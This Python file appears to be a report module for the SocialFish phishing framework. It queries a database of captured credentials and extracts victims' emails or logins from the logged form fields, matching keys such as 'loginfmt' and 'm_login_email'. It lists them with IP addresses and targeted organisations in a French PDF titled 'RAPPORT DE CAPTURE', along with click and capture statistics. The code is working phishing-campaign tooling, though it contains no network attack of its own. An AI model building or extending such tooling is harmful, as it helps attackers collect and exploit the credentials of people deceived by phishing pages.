import os
import subprocess
from pylatex import Document, PageStyle, Head, Foot, MiniPage, \
    StandAloneGraphic, MultiColumn, Tabu, LongTabu, LargeText, MediumText, \
    LineBreak, NewPage, Tabularx, TextColor, simple_page_number, Command
from pylatex.utils import bold, NoEscape
from sqlite3 import connect
from ast import literal_eval
from datetime import datetime

def generate_report(DATABASE, cpm, date_range):
    conex = connect(DATABASE)
    cursor = conex.cursor()
    
    all_creds = cursor.execute('SELECT * FROM creds').fetchall()
    
    try:
        dr = date_range.replace(' ', '').split('_')
        start_date = datetime.strptime(dr[0], '%m/%d/%Y')
        end_date = datetime.strptime(dr[1], '%m/%d/%Y')
        filter_by_date = True
    except Exception:
        filter_by_date = False

    filtered_query = []
    for row in all_creds:
        url_db = str(row[1])
        date_db_str = str(row[3])
        
        if cpm != 'All' and cpm not in url_db:
            continue
            
        if filter_by_date:
            try:
                row_date = datetime.strptime(date_db_str, '%m-%d-%Y')
                if not (start_date <= row_date <= end_date):
                    continue
            except Exception:
                pass
                
        filtered_query.append(row)

    return filtered_query, len(filtered_query)

def generate_unique(DATABASE, cpm, date_range=None):
    geometry_options = {
        "head": "60pt",
        "margin": "0.5in",
        "bottom": "0.6in",
        "includeheadfoot": True
    }
    doc = Document(geometry_options=geometry_options)
    
    first_page = PageStyle("firstpage")
    with first_page.create(Head("L")) as header_left:
        with header_left.create(MiniPage(width=NoEscape(r"0.49\textwidth"), pos='c', align='L')) as logo_wrapper:
            logo_file = os.path.join(os.path.dirname(__file__), 'SOCIALFISH_transparent.png')
            if os.path.exists(logo_file):
                logo_wrapper.append(StandAloneGraphic(image_options="width=120px", filename=logo_file))
    
    with first_page.create(Head("R")) as header_right:
        with header_right.create(MiniPage(width=NoEscape(r'0.49\textwidth'), pos='c', align='r')) as wrapper_right:
            wrapper_right.append(LargeText(bold('JB TECNICS')))
            wrapper_right.append(NoEscape(r'\par'))
            wrapper_right.append(MediumText(bold('Molinges')))
            wrapper_right.append(NoEscape(r'\par'))
            
            mois = ["Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"]
            now = datetime.now()
            date_fr = f"{now.day} {mois[now.month-1]} {now.year}"
            wrapper_right.append(date_fr)

    with first_page.create(Head('C')) as header_center:
        header_center.append('RAPPORT DE CAPTURE')
        
    with first_page.create(Foot("C")) as footer:
        pass

    doc.preamble.append(first_page)
    
    with doc.create(Tabu("X[l] X[r]")) as first_page_table:
        customer = MiniPage(width=NoEscape(r"0.49\textwidth"), pos='h')
        branch = MiniPage(width=NoEscape(r"0.49\textwidth"), pos='t!', align='r')
        first_page_table.add_row([customer, branch])
        first_page_table.add_empty_row()

    doc.change_document_style("firstpage")
    doc.add_color(name="lightgray", model="gray", description="0.80")

    conex = connect(DATABASE)
    cursor = conex.cursor()
    try:
        total_clicks = cursor.execute("SELECT clicks FROM socialfish WHERE id = 1").fetchone()[0]
        total_creds = cursor.execute("SELECT COUNT(*) FROM creds").fetchone()[0]
        not_picked_up = total_clicks - total_creds
    except Exception:
        total_clicks = 0
        not_picked_up = 0

    doc.append(LargeText(bold('Résumé des statistiques')))
    doc.append(NoEscape(r'\par\vspace{0.2cm}'))
    doc.append(f"Clics totaux : {total_clicks}")
    doc.append(NoEscape(r'\par\vspace{0.1cm}'))
    doc.append(f"Visiteurs non capturés : {not_picked_up}")
    doc.append(NoEscape(r'\par\vspace{0.5cm}'))

    with doc.create(LongTabu("X[15l]", row_height=1.8)) as data_table:
        data_table.add_row(["Informations de capture\n"], mapper=bold, color="lightgray")
        data_table.add_empty_row()
        data_table.add_hline()

        result_query, result_count = generate_report(DATABASE, cpm, date_range)

        for i in range(result_count):
            row = result_query[i]
            
            url = str(row[1]).replace('http://', '').replace('https://', '')
            ip = str(row[7])
            
            email_found = "Non trouvé"
            try:
                log_dict = literal_eval(row[2])
                if isinstance(log_dict, dict):
                    possible_keys = ['email', 'login', 'user', 'username', 'loginfmt', 'm_login_email']
                    for key, value in log_dict.items():
                        if any(pk in key.lower() for pk in possible_keys):
                            if value and str(value).strip() != "":
                                email_found = str(value)
                                break
            except Exception:
                pass

            row_tex = [f"Organisation: {url}\nIP: {ip}\nEmail: {email_found}\n"]

            if (i % 2) == 0:
                data_table.add_row(row_tex, color="lightgray")
            else:
                data_table.add_row(row_tex)

    doc.append(NewPage())
    
    if date_range:
        safe_date = date_range.replace('/', '-').replace(' - ', '_').replace(' ', '')
        pdf_name = f'Rapport_{safe_date}'
    else:
        pdf_name = f"Rapport_{datetime.now().strftime('%y%m')}"

    static_folder = os.path.join(os.getcwd(), 'templates', 'static')
    pdf_path_no_ext = os.path.join(static_folder, pdf_name)

    if not os.path.exists(static_folder):
        os.makedirs(static_folder)

    doc.generate_tex(pdf_path_no_ext)
    
    try:
        subprocess.run(
            ['pdflatex', '-interaction=nonstopmode', f'{pdf_name}.tex'],
            cwd=static_folder,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=True
        )
    except subprocess.CalledProcessError:
        pass
        
    return f"{pdf_name}.pdf"
